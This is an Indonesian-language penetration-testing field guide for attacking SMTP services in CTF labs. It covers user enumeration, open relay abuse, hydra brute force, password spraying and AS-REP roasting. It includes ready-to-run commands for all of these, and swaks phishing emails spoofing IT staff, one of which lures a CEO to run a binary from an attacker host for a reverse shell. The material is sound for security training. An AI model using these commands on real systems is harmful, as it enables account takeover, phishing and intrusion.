---
id: "08"
title: "08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "08_smtp_workflow.md"
refs_out: ["05","06","07","09","11","12","14a","14b","35","45"]
refs_in: ["04","05","07","09","10"]
---

# 08. SMTP Exploitation & User Enumeration Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation Workflow (Network & Infrastructure)
SERVICE TARGET     : Simple Mail Transfer Protocol (SMTP / SMTPS / Submission)
DEFAULT PORTS      : TCP 25 (Standard / Relay), TCP 465 (SMTPS), TCP 587 (Submission)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh), [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)
==================================================================================
```

---

## 🧠 BAGIAN 1: SMTP FUNDAMENTALS

### 1.1 Apa itu SMTP dan Cara Kerjanya? (Analogi Kotak Pos & Kurir Ekspedisi)

**Simple Mail Transfer Protocol (SMTP)** adalah protokol standar industri berbasis teks (didefinisikan dalam RFC 5321) yang digunakan untuk **mengirimkan dan merutekan email** antar server surat (*Mail Transfer Agent / MTA*) serta dari klien email (*Mail User Agent / MUA*) ke server.

```text
+=============================================================================+
|                    ANALOGI KOTAK POS & KURIR EKSPEDISI                      |
+=============================================================================+
|                                                                             |
|  [ PENGIRIM ] ──(SMTP: Menaruh surat ke kotak pos)──> [ KANTOR POS ASAL ]   |
|                                                               │             |
|                                                     (SMTP: Antar-Kurir)     |
|                                                               ▼             |
|  [ PENERIMA ] <──(POP3/IMAP: Mengambil surat)── [ KANTOR POS TUJUAN ]       |
|                                                                             |
|  KESIMPULAN:                                                                |
|  - SMTP adalah protokol "PUSH" (Khusus Mengirimkan Surat).                  |
|  - POP3 / IMAP adalah protokol "PULL" (Khusus Mengambil Surat dari Kotak).  |
+=============================================================================+
```

---

### 1.2 Port-Port yang Terlibat dalam Ekosistem Mail

```text
+--------------------+---------------------+---------------------------------------------------------+
| Port               | Protokol / Peran    | Karakteristik & Penggunaan Pentest                      |
+--------------------+---------------------+---------------------------------------------------------+
| **Port 25 (TCP)**  | SMTP (Relay / MTA)  | Komunikasi antar-server email. Biasanya plaintext murni |
|                    |                     | dan merupakan target utama User Enumeration di CTF.     |
+--------------------+---------------------+---------------------------------------------------------+
| **Port 587 (TCP)** | SMTP Submission     | Standar modern pengiriman email oleh user ke server.    |
|                    |                     | Mewajibkan otentikasi dan enkripsi STARTTLS.            |
+--------------------+---------------------+---------------------------------------------------------+
| **Port 465 (TCP)** | SMTPS (Implicit TLS)| Layanan SMTP terenkripsi SSL/TLS sejak awal koneksi     |
|                    |                     | (Legacy Microsoft / Cisco standard).                    |
+--------------------+---------------------+---------------------------------------------------------+
```

---

### 1.3 Perbedaan Krusial: SMTP vs. POP3 vs. IMAP

Jangan sampai tertukar antara protokol pengirim dan penarik email:

| Protokol | Port Default | Arah Aliran Data | Peran Utama dalam Pentest |
| :--- | :--- | :--- | :--- |
| **SMTP** | 25, 465, 587 | **Outbound (Kirim / Push)** | Enumerasi username (`VRFY`/`RCPT TO`), Open Relay Phishing, dan NTLM leak. |
| **POP3** | 110 (Plain), 995 (SSL) | **Inbound (Tarik / Pull)** | Mengunduh email ke lokal lalu menghapusnya di server. Sumber pembacaan password reset token. |
| **IMAP** | 143 (Plain), 993 (SSL) | **Inbound (Sinkronisasi)** | Membaca folder email secara interaktif di server. Sumber pembacaan invoice / private key. |

---

### 1.4 Perintah Dasar Protokol SMTP (*Raw SMTP Commands*)

Komunikasi SMTP berjalan menggunakan perintah teks ASCII sederhana:

* `HELO <domain>` / `EHLO <domain>` : Membuka percakapan (*handshake*). `EHLO` meminta daftar kapabilitas ekstensi server (*Extended SMTP*).
* `VRFY <username>` : Meminta server memverifikasi apakah akun user tertentu ada (*Verify*).
* `EXPN <mailing-list>` : Menanyakan daftar email anggota di dalam suatu mailing list (*Expand*).
* `MAIL FROM:<email>` : Menentukan alamat email pengirim.
* `RCPT TO:<email>` : Menentukan alamat email penerima.
* `DATA` : Memulai penulisan isi surat (diakhiri dengan baris berisi titik tunggal `.`).
* `RSET` : Mereset transaksi pengiriman yang sedang berjalan.
* `QUIT` : Menutup koneksi.

---

### 1.5 Apa itu Open Relay & Mengapa Sangat Berbahaya?

**Open Relay** adalah miskonfigurasi server SMTP di mana server bersedia menerima dan meneruskan (*relay*) email dari siapa pun ke tujuan mana pun tanpa memerlukan autentikasi identitas pengirim.

```text
[ ATTACKER ] ── Kirim Email Palsu (From: ceo@target.htb) ──> [ OPEN RELAY SERVER ]
                                                                     │
                                                   (Diteruskan tanpa verifikasi)
                                                                     ▼
                                                             [ KORBAN KARYAWAN ]
                                                    (Menerima phishing internal!)
```
* **Dampak**: Penyerang dapat mengirimkan email *spoofed* mengatasnamakan Administrator internal untuk mengirimkan link phishing, instruksi transfer uang, atau link reverse shell kepada staf perusahaan.

---

### 1.6 Konsep Dasar Validasi Email: SPF, DKIM, dan DMARC

1. **SPF (Sender Policy Framework)**: Catatan DNS TXT yang mencantumkan IP mana saja yang diizinkan mengirim email atas nama domain tersebut.
2. **DKIM (DomainKeys Identified Mail)**: Tanda tangan digital kriptografi pada header email untuk memastikan isi surat tidak diubah di jalan.
3. **DMARC**: Kebijakan yang menentukan apa yang harus dilakukan (Reject/Quarantine) jika email gagal lolos verifikasi SPF atau DKIM.

---

### 1.7 Cara Membaca Banner SMTP

Begitu Anda menghubungkan netcat ke port 25, server akan mengembalikan respon banner `220`:

```text
220 mail.corp.htb ESMTP Postfix (Ubuntu)
│   │             │     │       │
│   │             │     │       └── Sistem Operasi: Linux Ubuntu
│   │             │     └── Daemon Software: Postfix MTA
│   │             └── Fitur: Extended SMTP didukung
│   └── Hostname Server: mail.corp.htb (Domain FQDN untuk /etc/hosts!)
220 EXCH01.inlanefreight.local Microsoft ESMTP MAIL Service ready
└── Target adalah Windows Server Microsoft Exchange (Pasti Active Directory environment!)
```

---

## 🛠️ BAGIAN 2: TOOL ARSENAL SMTP

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                    KECEPATAN   INTERAKTIF   PENGGUNAAN UTAMA DI CTF
=======================================================================================================
nc (netcat)        Raw Socket Interaction          Sangat Cepat Ya          Manual VRFY/RCPT TO & Banner
telnet             Interactive Protocol Debugger   Cepat       Ya          Manual Mail Dispatching
smtp-user-enum     Dedicated Username Harvester    Sangat Cepat Tidak       Automated VRFY/EXPN/RCPT TO
swaks              Swiss-Army Knife for SMTP       Sangat Cepat Tidak       Test Auth, TLS, & Mail Spoof
sendEmail          CLI Email Dispatcher            Cepat       Tidak       Automated Email Phishing
hydra              Online Authentication Bruter    Cepat       Tidak       Password bruteforce port 25/587
nmap (NSE)         Vulnerability & Relay Audit     Sedang      Tidak       Automated Open-Relay & CVEs
curl               Single-line SMTP Probe          Sangat Cepat Tidak       Direct Mail Sending via CLI
=======================================================================================================
```

---

### 2.1 `nc` (Netcat) & `telnet` — Manual SMTP Probing
* **Fungsi**: Berinteraksi langsung dengan daemon SMTP pada level protokol teks mentah.
* **Kapan Digunakan**: Menguji respon `VRFY` manual dan mengonfirmasi banner hostname.

```bash
# Menghubungkan ke port 25 tanpa overhead protokol
nc -vn -w 5 $TARGET 25
```

---

### 2.2 `smtp-user-enum` — Dedicated Username Harvester
* **Fungsi**: Alat otomatis tercepat di Parrot OS untuk memvalidasi daftar username terhadap server SMTP.
* **Flag Penting**:
  * `-M <mode>` : Metode validasi (`VRFY`, `EXPN`, atau `RCPT`).
  * `-u <user>` / `-U <file>` : Username tunggal atau file wordlist username.
  * `-t <target>` : Host IP target.
  * `-D <domain>` : Menentukan nama domain saat menggunakan mode `RCPT` (misal: `-D corp.htb`).

```bash
# Validasi user menggunakan mode VRFY
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
```

---

### 2.3 `swaks` — Swiss Army Knife for SMTP
* **Fungsi**: Tool serbaguna untuk menguji transaksi SMTP lengkap, autentikasi, STARTTLS, dan pengiriman email spoofing.
* **Flag Penting**:
  * `--to <email>` : Email tujuan.
  * `--from <email>` : Email pengirim palsu.
  * `--server <target>` : IP server SMTP.
  * `--auth <type>` : Menguji metode auth (LOGIN, PLAIN, NTLM).

```bash
# Mengirim email uji coba tanpa password (Open Relay check)
swaks --to admin@target.htb --from root@target.htb --server $TARGET --body "Testing SMTP Service"
```

---

### 2.4 `nmap` NSE Scripts untuk SMTP

```bash
# 1. Menampilkan seluruh kapabilitas perintah SMTP yang didukung
nmap -p 25 --script smtp-commands $TARGET

# 2. Enumerasi username otomatis via script Nmap
nmap -p 25 --script smtp-enum-users --script-args="smtp-enum-users.methods={VRFY,RCPT}" $TARGET

# 3. Pengecekan Open Relay vulnerability
nmap -p 25 --script smtp-open-relay $TARGET
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Environment Variable Target di Terminal Parrot OS:
export TARGET="10.10.11.200"
echo "Target Mail Server set to: $TARGET"
```

---

### FASE 1: BANNER GRABBING & SERVICE FINGERPRINT

**Tujuan**: Mengidentifikasi daemon software (Postfix/Sendmail/Exim/Exchange), hostname FQDN, dan ekstensi perintah yang didukung.

```bash
# 1. Raw Banner Grabbing via Netcat
nc -vn -w 5 $TARGET 25

# 2. Nmap Service Version & Supported Commands Scan
nmap -sV -p 25,465,587 --script smtp-commands,banner $TARGET -oN nmap_smtp.txt
```

* **Contoh Output Nyata Nmap `smtp-commands`**:
```text
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_banner: 220 mail.inlanefreight.htb ESMTP Postfix (Ubuntu)
| smtp-commands: mail.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
```

* **Cara Membaca Output**:
  * `VRFY` tercantum ➔ Anda **bisa langsung melakukan User Enumeration** secara instan!
  * Hostname: `mail.inlanefreight.htb` ➔ Wajib didaftarkan ke `/etc/hosts`:
    ```bash
    echo "$TARGET inlanefreight.htb mail.inlanefreight.htb" | sudo tee -a /etc/hosts
    ```

---

### FASE 2: USER ENUMERATION (3 METODE MASTER)

Ini adalah fungsi paling bernilai dari layanan SMTP di lingkungan CTF & Active Directory. Ada 3 metode utama:

```text
+=============================================================================+
|                      3 METODE USER ENUMERATION SMTP                         |
+=============================================================================+
| 1. VRFY METHOD   : Meminta server memverifikasi user secara langsung.       |
| 2. EXPN METHOD   : Mengembangkan mailing list untuk membongkar member.      |
| 3. RCPT TO METHOD: Paling andal! Menguji apakah kotak surat user diterima.  |
+=============================================================================+
```

---

#### 1. Metode A: `VRFY` (Verify Command)

* **Respon Server**:
  * `250 2.1.5 <user>` ➔ **USER VALID (ADA DI SISTEM)**
  * `550 5.1.1 <user>: User unknown` ➔ **USER INVALID**
  * `502 5.5.2 Command not implemented` ➔ Perintah dinonaktifkan (Gunakan Metode C).

```bash
# A. Uji Coba Manual via Netcat:
nc -vn $TARGET 25
```
```text
220 mail.inlanefreight.htb ESMTP Postfix
HELO attacker.htb
250 mail.inlanefreight.htb
VRFY root
250 2.1.5 root@inlanefreight.htb          <-- USER VALID!
VRFY fakeuser123
550 5.1.1 <fakeuser123>: Recipient address rejected: User unknown in local recipient table
QUIT
221 2.0.0 Bye
```

```bash
# B. Otomasi Menggunakan smtp-user-enum (SecLists Wordlist):
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET | tee smtp_users.txt
```

---

#### 2. Metode B: `EXPN` (Expand Mailing List)

* **Respon Server**: `250` mengembalikan daftar alamat email yang tergabung dalam grup alias (misal: grup `devs` atau `support`).

```bash
# Otomasi via smtp-user-enum:
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
```

---

#### 3. Metode C: `RCPT TO` (Paling Andal / *Most Reliable*)

Jika perintah `VRFY` dan `EXPN` dinonaktifkan oleh sysadmin (*Error 502*), metode `RCPT TO` **hampir selalu berhasil** karena ini adalah bagian inti dari transaksi pengiriman email standar.

```bash
# A. Uji Coba Manual via Netcat:
nc -vn $TARGET 25
```
```text
220 mail.inlanefreight.htb ESMTP Postfix
HELO attacker.htb
250 mail.inlanefreight.htb
MAIL FROM:<test@attacker.htb>
250 2.1.0 Ok
RCPT TO:<jordan@inlanefreight.htb>
250 2.1.5 Ok                              <-- USER JORDAN ADA!
RCPT TO:<nonexistent@inlanefreight.htb>
550 5.1.1 <nonexistent@inlanefreight.htb>: User unknown in virtual mailbox table
RSET
250 2.0.0 Ok
QUIT
221 2.0.0 Bye
```

```bash
# B. Otomasi Menggunakan smtp-user-enum Mode RCPT:
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -D inlanefreight.htb -t $TARGET
```

```bash
# C. Ekstraksi Hasil Valid User ke File Bersih:
grep "[+]" smtp_users.txt | awk '{print $NF}' | tr -d '<>' | cut -d'@' -f1 | sort -u > valid_users.txt
cat valid_users.txt
```

---

### FASE 3: OPEN RELAY AUDIT & EXPLOITATION

**Tujuan**: Menguji apakah server mengizinkan pengiriman email ke domain eksternal tanpa otentikasi.

```bash
# 1. Pengecekan Otomatis via Nmap Script
nmap -p 25 --script smtp-open-relay $TARGET
```

* **Contoh Output Vulnerable Open Relay**:
```text
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests allowed)
|   MAIL FROM:<test@attacker.com> -> RCPT TO:<victim@external.com> [ALLOWED]
```

```bash
# 2. Eksploitasi Open Relay Menggunakan Swaks:
# Mengirim email instruksi palsu mengatasnamakan Admin IT ke target internal
swaks --to "karyawan@inlanefreight.htb" \
      --from "it-support@inlanefreight.htb" \
      --server $TARGET \
      --header "Subject: PENTING: Segera Reset Password Domain Anda" \
      --body "Silakan login ke portal internal berikut untuk reset password: http://10.10.14.5/login.html"
```

---

### FASE 4: SMTP AUTHENTICATION TESTING & BRUTE FORCE

Jika server mewajibkan otentikasi pada Port 587 atau Port 25:

```bash
# 1. Cek Metode Autentikasi yang Didukung (LOGIN / PLAIN / NTLM / CRAM-MD5)
nc -vn $TARGET 25
# Ketik: EHLO test.com
# Cari baris: 250-AUTH LOGIN PLAIN NTLM
```

```bash
# Menggunakan skema protokol (Sangat direkomendasikan): 
hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 25 -t 4 -f -V smtp://$TARGET

# B. Port 587 (Submission dengan STARTTLS): 
hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 587 -t 4 -f -V smtp://$TARGET 

# C. Port 465 (SMTPS / Direct Implicit SSL): 
hydra -l jordan -P /usr/share/wordlists/rockyou.txt -s 465 -S -t 4 -f -V smtp://$TARGET
```

---

### FASE 5: INFORMATION GATHERING VIA SMTP

Informasi intelijen sensitif yang sering didapatkan dari SMTP:
1. **Nama Domain Asli & Subdomain Internal**: Diekstrak langsung dari banner dan respon `EHLO` (`mail.corp.internal`, `dc01.corp.local`).
2. **Distro OS & Patch Level**: Banner Postfix/Exim membocorkan versi Linux (`Ubuntu-4ubuntu0.3`, `Debian`).
3. **Versi Microsoft Exchange**: String build Exchange (`15.1.2507.6`) untuk mencocokkan celah RCE legendaris seperti **ProxyLogon (CVE-2021-26855)** atau **ProxyShell (CVE-2021-34473)**.

---

### FASE 6: CVE CHECK BERDASARKAN VERSI SMTP

Ekstrak string software dan nomor versi dari banner SMTP (contoh: `220 mail.htb ESMTP Exim 4.89 Ubuntu` ➔ Versi: `Exim 4.89`):

```bash
# 1. Cari exploit lokal di Searchsploit berdasarkan software + versi:
searchsploit postfix 2.
searchsploit exim 4.89
searchsploit sendmail
searchsploit "exchange 2016"
```

#### Pemetaan CVE Penting yang Wajib Dihafal di CTF:

| Software | Versi Rentan | CVE & Nama Kerentanan | Dampak & Vektor Eksploitasi |
| :--- | :--- | :--- | :--- |
| **Exim** | 4.87 s/d 4.91 | **CVE-2019-10149** (*The Return of the WIZard*) | **Remote Command Execution (Root Shell)** via recipient command injection. |
| **Exim** | < 4.94.2 | **CVE-2021-38371** | STARTTLS Plaintext Command Injection. |
| **MS Exchange** | 2013, 2016, 2019 | **CVE-2021-26855** (*ProxyLogon*) | Pre-auth SSRF to **Remote Code Execution (SYSTEM)**. |
| **MS Exchange** | 2013, 2016, 2019 | **CVE-2021-34473** (*ProxyShell*) | Pre-auth Path Confusion to **Remote Code Execution**. |
| **Sendmail** | 8.x Legacy | **CVE-2014-3956** | Information Disclosure & DoS. |

---

## 🌳 BAGIAN 4: DECISION TREE LENGKAP

```text
                           [PORT 25 / 587 TERBUKA]
                                      │
                       ┌──────────────┴──────────────┐
                       │   Banner Grabbing (nc/nmap) │
                       │   Identifikasi Hostname & OS│
                       └──────────────┬──────────────┘
                                      │
                 ┌────────────────────┴────────────────────┐
                 │                                         │
        [MICROSOFT EXCHANGE]                       [LINUX POSTFIX/EXIM]
                 │                                         │
     Cek Build Version & OWA                       Cek Ekstensi EHLO
     (ProxyLogon/ProxyShell)                               │
                 │                                         │
                 └────────────────────┬────────────────────┘
                                      │
                             [USER ENUMERATION]
                                      │
                   ┌──────────────────┼──────────────────┐
                   │                  │                  │
              [VRFY MODE]        [EXPN MODE]        [RCPT TO MODE]
                   │                  │                  │
              Respon 250?        Respon 250?        Respon 250?
                   │                  │                  │
                   └──────────────────┬──────────────────┘
                                      │
                             [VALID USERS FOUND]
                                      │
                 ┌────────────────────┴────────────────────┐
                 │                                         │
        [CEK OPEN RELAY?]                        [PIVOT KE SERVICE LAIN]
                 │                                         │
        ┌────────┴────────┐               ┌────────────────┼────────────────┐
        │                 │               │                │                │
     [VULN]            [SECURE]      [SSH SPRAY]      [SMB SPRAY]     [AD ROASTING]
        │                 │               │                │                │
  Kirim Phishing     Auth Spray      nxc ssh          nxc smb          impacket-
  Internal via       via Hydra       (Port 22)        (Port 445)       GetNPUsers
  Swaks              (Port 587)      [File 06]        [File 05]        (Port 88)
```

---

## 🔗 BAGIAN 5: SMTP + ATTACK CHAINING

SMTP adalah pintu gerbang enumerasi identitas pengguna. Berikut adalah cara merantai data SMTP ke service lain:

```text
+=============================================================================+
|                      SMTP ATTACK CHAINING WORKFLOW                          |
+=============================================================================+
```

### 🔗 Chain 1: SMTP User Enum ➔ SSH Password Spraying & Bruteforce ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh))
```bash
# 1. Dapatkan daftar user valid dari SMTP
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET > smtp_out.txt
grep "\[+\]" smtp_out.txt | awk '{print $NF}' | tr -d '<>' | cut -d'@' -f1 | sort -u > users_clean.txt

# 2. OPSI A: Password SPRAYING (Sedikit password umum terhadap BANYAK user - Rekomendasi CTF & Real-world):
nxc ssh $TARGET -u users_clean.txt -p 'Password123!' --continue-on-success
nxc ssh $TARGET -u users_clean.txt -p 'Welcome2024!' --continue-on-success

# 3. OPSI B: Password BRUTEFORCE (SATU user bernilai tinggi terhadap wordlist besar rockyou.txt):
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://$TARGET

# Atau jika format IP target dan layanan dipisah di paling akhir:
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V $TARGET ssh
```

---

### 🔗 Chain 2: SMTP User Enum ➔ SMB Password Spray ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba))
```bash
# Uji password musiman perusahaan terhadap daftar user SMTP
nxc smb $TARGET -u users_clean.txt -p 'Welcome2024!' --continue-on-success
```

---

### 🔗 Chain 3: SMTP User Enum ➔ AS-REP Roasting (Active Directory)
```bash
# Gunakan daftar username SMTP untuk meminta TGT tanpa pre-authentication
impacket-GetNPUsers domain.local/ -usersfile users_clean.txt -format hashcat -no-pass -dc-ip $TARGET -outputfile asrep.hashes
```

---

### 🔗 Chain 4: Open Relay ➔ Password Reset Interception via Mailbox
```bash
# Jika Anda menemukan service Web yang memiliki fitur "Lupa Password",
# picu permintaan reset password, lalu pantau kotak surat internal jika Anda memiliki akses read.
```

---

### 🔗 Chain 5: SMTP Creds ➔ Akses Kotak Surat IMAP / POP3
```bash
# Uji kredensial SMTP yang berhasil di-crack ke port POP3 (110) atau IMAP (143)
curl -u "jordan:P@ssw0rd123" "imap://$TARGET/INBOX;UID=1"
```

---

## 🏢 BAGIAN 6: SMTP DI ACTIVE DIRECTORY ENVIRONMENT

Di lingkungan Windows Domain Controller dan Microsoft Exchange, SMTP adalah tambang emas untuk memetakan format akun Active Directory dan mengekstrak info domain internal:

---

### 6.1 Ekstraksi & Konversi Format Email ke Username AD

Seringkali output SMTP mengembalikan format email lengkap (contoh: `jordan.belfort@corp.local`). Kita perlu mengonversinya ke format akun Active Directory:

```bash
# 1. Ekstraksi nama akun bersih dari output smtp-user-enum:
grep "\[+\]" smtp_out.txt | awk '{print $NF}' | tr -d '<>' | cut -d'@' -f1 > full_names.txt

# 2. OPSI A: Menggunakan tool 'username-anarchy' untuk generate variasi otomatis:
# (Install jika belum ada: git clone https://github.com/urbanadventurer/username-anarchy)
cat full_names.txt | username-anarchy > username_variants.txt

# 3. OPSI B: Script Bash Generator Pola Umum AD (Format jbelfort, jordan.belfort, jordanb):
while IFS= read -r user; do
  fname=$(echo "$user" | cut -d'.' -f1)
  lname=$(echo "$user" | cut -d'.' -f2)
  if [ -n "$lname" ] && [ "$fname" != "$lname" ]; then
    echo "${fname:0:1}${lname}"          # jbelfort (Inisial depan + nama belakang)
    echo "${fname}.${lname}"             # jordan.belfort (Standar email)
    echo "${fname}${lname:0:1}"          # jordanb (Nama depan + inisial belakang)
    echo "${lname}${fname:0:1}"          # belfortj
    echo "${fname}_${lname}"             # jordan_belfort
  else
    echo "$fname"                        # Single username (admin, root, support)
  fi
done < full_names.txt | sort -u > all_ad_variants.txt

cat all_ad_variants.txt
```

---

### 6.2 NTLM Authentication Challenge & Domain Discovery

Server Microsoft Exchange sering mengaktifkan autentikasi NTLM pada port 25/587. Kita dapat mengirim probe NTLM mentah untuk membongkar nama domain NetBIOS dan hostname server:

#### Langkah 1: Kirim NTLM Type-1 Auth Challenge via Telnet
```bash
telnet $TARGET 25
```
```text
EHLO attacker.com
AUTH NTLM
334
TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAFAs4OAAAADw==
334 TlRMTVNTUAACAAAADAAMADgAAAAFgoqi...  <-- NTLM Type-2 Challenge Base64
QUIT
```

#### Langkah 2: Decode Base64 NTLM Challenge (3 Pilihan Metode):

```bash
# METODE 1: Decode Langsung via Python Script (Ekstrak NetBIOS Domain Name)
python3 -c "
import base64, struct
# Masukkan string base64 challenge dari respon server di atas:
raw_b64 = 'TlRMTVNTUAACAAAADAAMADgAAAAFgoqi...'
data = base64.b64decode(raw_b64)
# Ekstrak panjang dan offset Target Name (NetBIOS Domain):
nb_len = struct.unpack('<H', data[12:14])[0]
nb_off = struct.unpack('<I', data[16:20])[0]
print('[+] NetBIOS Domain Name:', data[nb_off:nb_off+nb_len].decode('utf-16-le'))
"

# METODE 2: Gunakan NetExec (nxc) Secara Otomatis
nxc smtp $TARGET -p 25

# METODE 3: Capture Hash NTLM via Responder (Jika target terhubung balik)
sudo responder -I tun0 -v
```

---

## 🔧 BAGIAN 7: COMMON ERRORS & TROUBLESHOOTING

### 1. `550 5.1.1 User unknown` / `Recipient address rejected`
* **Penyebab**: Username yang diuji tidak terdaftar di server mail.
* **Solusi**: Lanjutkan fuzzing menggunakan wordlist username yang lebih komprehensif.

### 2. `503 5.5.1 Error: need RCPT command` / `Bad sequence of commands`
* **Penyebab**: Urutan perintah manual salah. Anda mencoba mengetik `DATA` sebelum menentukan `MAIL FROM` dan `RCPT TO`.
* **Solusi**: Ikuti urutan standar: `HELO` ➔ `MAIL FROM` ➔ `RCPT TO` ➔ `DATA`.

### 3. `502 5.5.2 Command not implemented` (VRFY Disabled)
* **Penyebab**: Administrator menonaktifkan perintah `VRFY` untuk mencegah enumerasi akun.
* **Solusi**: Beralih menggunakan **Metode C (`RCPT TO`)** via `smtp-user-enum -M RCPT`.

### 4. `421 4.7.0 Connection rate limit exceeded`
* **Penyebab**: Server membatasi jumlah koneksi per menit (*Anti-Spam Throttling*).
* **Solusi**: Turunkan kecepatan scanning `smtp-user-enum` atau tambahkan jeda delay.

### 5. `535 5.7.8 Authentication failed` / `Authentication credentials invalid`
* **Penyebab**: Username atau password salah saat autentikasi SMTP.
* **Solusi**: Jalankan password spraying dengan wordlist password yang lebih terarah.

### 6. `454 4.7.0 TLS not available due to local problem`
* **Penyebab**: Sertifikat SSL server kadaluarsa atau client tidak menegosiasikan ciphers yang cocok.
* **Solusi**: Gunakan opsi `--no-tls` pada tool pengirim atau nonaktifkan validasi sertifikat di `swaks` (`-tls-optional`).

### 7. Timeout Saat Mengetik Perintah `DATA`
* **Penyebab**: Server menunggu tanda penutup pesan.
* **Solusi**: Ketik karakter titik tunggal pada baris baru (`\r\n.\r\n`) lalu tekan ENTER.

### 8. `Connection refused` pada Port 25
* **Penyebab**: Port 25 diblokir firewall ISP atau dipindahkan ke port Submission 587.
* **Solusi**: Pindai port alternatif: `nmap -p 25,465,587 $TARGET`.

---

## 🏆 BAGIAN 8: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: SMTP VRFY ➔ Username Harvesting ➔ SSH Brute Force ➔ Initial Shell

**Target**: Linux Box (HTB Networked / Cronos style)

#### Step 1: Banner & VRFY Enumeration
```bash
nc -vn $TARGET 25
```
```text
220 mail.cronos.htb ESMTP Postfix (Ubuntu)
HELO test.com
250 mail.cronos.htb
VRFY admin
250 2.1.5 admin@cronos.htb
VRFY support
550 5.1.1 <support>: User unknown
```

#### Step 2: Automated Harvest via SecLists
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
```
```text
[+] 10.10.11.85: admin exists
[+] 10.10.11.85: root exists
[+] 10.10.11.85: www-data exists
```

#### Step 3: Password Spraying terhadap SSH ([06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh))
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V ssh://$TARGET
```
```text
[22][ssh] host: 10.10.11.85   login: admin   password: password123
```
```bash
ssh admin@$TARGET
# Shell Access Obtained!
```

---

### 📝 EXAMPLE 2: SMTP RCPT TO ➔ SMB Password Spray ➔ WinRM Shell

**Target**: Windows Active Directory Box (HTB Forest style)

#### Step 1: Enumerasi User via Mode RCPT
```bash
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -D htb.local -t $TARGET
```
```text
[+] 10.10.11.90: sebastian@htb.local exists
[+] 10.10.11.90: lucinda@htb.local exists
[+] 10.10.11.90: mark@htb.local exists
```

#### Step 2: Simpan Daftar User & Jalankan Spraying ke SMB ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba))
```bash
echo -e "sebastian\nlucinda\nmark" > ad_users.txt
nxc smb $TARGET -u ad_users.txt -p 'Welcome2024!' --continue-on-success
```
```text
SMB    10.10.11.90    445    DC01    [+] htb.local\lucinda:Welcome2024!
```

#### Step 3: Spawn Interactive Shell via WinRM
```bash
evil-winrm -i $TARGET -u 'lucinda' -p 'Welcome2024!'
```

---

### 📝 EXAMPLE 3: Open Relay Abuse ➔ Internal Phishing Simulation

**Target**: HTB Medium Enterprise Box

#### Step 1: Verifikasi Open Relay
```bash
nmap -p 25 --script smtp-open-relay $TARGET
# Output: Server is an open relay
```

#### Step 2: Kirim Email Phishing Berisi Payload URL
```bash
swaks --to "ceo@megacorp.htb" \
      --from "it-admin@megacorp.htb" \
      --server $TARGET \
      --header "Subject: Urgent: Mandatory Security Audit" \
      --body "Please execute our internal diagnostic binary: http://10.10.14.5/agent.exe"
```
*(Saat korban mengeksekusi payload di sistemnya, listener Netcat lokal kita langsung menerima reverse shell).*

---

## ⚡ BAGIAN 9: CHEATSHEET SMTP (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export DOMAIN="target.htb"
export USER="username"
export PASS="password"
```

```bash
# ==========================================
# 1. RECON & BANNER GRABBING
# ==========================================
nc -vn -w 5 $TARGET 25                                   # Raw banner probe
nmap -sV -p 25,465,587 --script smtp-commands $TARGET    # Capabilities & Extensions check
nmap -p 25 --script smtp-open-relay $TARGET              # Open relay audit

# ==========================================
# 2. USER ENUMERATION (3 MODES)
# ==========================================
# Mode VRFY (Direct Verify):
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET

# Mode EXPN (Mailing List Expand):
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET

# Mode RCPT (Most Reliable):
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -D $DOMAIN -t $TARGET

# ==========================================
# 3. MANUAL PROTOCOL INTERACTION (NETCAT)
# ==========================================
# HELO $DOMAIN
# MAIL FROM:<test@attacker.com>
# RCPT TO:<user@$DOMAIN>
# DATA
# Subject: Test Mail
# This is a test message.
# .
# QUIT

# ==========================================
# 4. OPEN RELAY & PHISHING DISPATCH (SWAKS)
# ==========================================
swaks --to "admin@$DOMAIN" --from "support@$DOMAIN" --server $TARGET --body "Hello Admin"

# ==========================================
